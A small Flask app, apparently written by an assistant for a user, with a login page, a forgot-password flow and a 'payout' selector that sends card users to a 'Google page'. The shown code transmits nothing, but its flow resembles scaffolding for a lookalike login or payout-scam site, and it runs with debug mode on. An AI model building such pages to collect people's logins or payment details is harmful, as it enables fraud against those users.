from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = "replace-this-with-a-random-development-secret"

@app.get("/")
def login():
    return render_template("login.html")

@app.post("/login")
def handle_login():
    email = request.form.get("email", "").strip()
    if not email:
        return render_template("login.html", error="Please enter your email or mobile number.")
    session["demo_email"] = email
    return redirect(url_for("demo_result"))

@app.get("/forgot-password")
def forgot_password():
    return render_template("forgot.html")

@app.post("/forgot-password")
def handle_forgot_password():
    email = request.form.get("email", "").strip()
    if not email:
        return render_template("forgot.html", error="Please enter your email or mobile number.")
    session["reset_email"] = email
    return redirect(url_for("reset_sent"))

@app.get("/reset-sent")
def reset_sent():
    return render_template("reset_sent.html", email=session.get("reset_email", ""))

@app.get("/demo-result")
def demo_result():
    return render_template("demo_result.html", email=session.get("demo_email", ""))

@app.get("/payout")
def payout():
    return render_template("payout.html")

@app.post("/payout/select")
def payout_select():
    method = request.form.get("method", "")
    if method == "hexer":
        # Replace "hexer.html" with the route serving your existing HEXER page.
        return redirect(url_for("hexer_page"))
    if method == "cashland":
        return redirect(url_for("cashland"))
    if method == "card":
        # User requested the existing Google page for the card option.
        return redirect(url_for("google_page"))
    return redirect(url_for("payout"))

@app.get("/hexer")
def hexer_page():
    # Placeholder route: point this at your existing HEXER page/template.
    return render_template("hexer.html")

@app.get("/cashland")
def cashland():
    return render_template("cashland.html")

@app.post("/cashland")
def cashland_receive():
    handle = request.form.get("handle", "").strip()
    if not handle:
        return redirect(url_for("cashland"))
    # Demo only: don't store or transmit financial credentials.
    session["cashland_handle"] = handle
    return render_template("cashland.html", success=True, handle=handle)

@app.get("/google")
def google_page():
    # Expected file: templates/google.html
    return render_template("google.html")

if __name__ == "__main__":
    app.run(debug=True)
